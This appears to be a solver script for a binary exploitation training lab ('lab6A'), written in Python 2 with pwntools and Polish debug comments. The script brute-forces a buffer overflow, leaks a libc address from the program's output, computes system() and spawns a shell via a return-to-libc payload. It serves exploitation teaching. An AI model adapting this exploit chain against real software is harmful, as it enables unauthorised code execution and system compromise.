from pwn import *
import struct

while(True):
    p = process('/levels/lab06/lab6A')
    p.recv(500)
    p.sendline('1')
    p.recv(500)

    adres = 0xb77fcbe2

    payload = "A"*122
    payload += struct.pack("<L", adres)

    p.sendline(payload)
    p.recv(500)

    try:
        p.sendline('3')
        wynik = p.recv(500)
        if 'Username' in wynik:
            print hexdump(wynik)

            p.sendline('1')
            p.sendline('z')
            p.sendline('x')
            p.sendline('3')

            print 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

            ret = p.recv(500)
            print hexdump(ret)

            address_libc = []
            address_libc.append(ret[0xf1])
            address_libc.append(ret[0xf2])
            address_libc.append(ret[0xf3])
            address_libc.append(ret[0xf4])

            adres = 0
            adres += ord(address_libc[0])
            adres += ord(address_libc[1]) << 8
            adres += ord(address_libc[2]) << 16
            adres += ord(address_libc[3]) << 24

            print 'DEBUG start libc jest w tym adresie:'
            print hex(adres)
            print 'wiec system bedzie:'
            adres_do_system = adres+0x2670d
            print hex(adres_do_system)

            #for x in address_libc: print x

            p.sendline('1')
            payload1 = "/"*19+"/bin/sh"+"\x00"
            payload2 = "B"*96+struct.pack("<L",adres_do_system)
            p.sendline(payload1)
            p.sendline(payload2)
            p.sendline('3')

            p.interactive()

            break
    except EOFError as e:
        pass
'''
#p.sendline('1')
p.sendline('z')
p.sendline('x')
p.sendline('3')
ret = p.recv(500)
print hexdump(ret)
'''

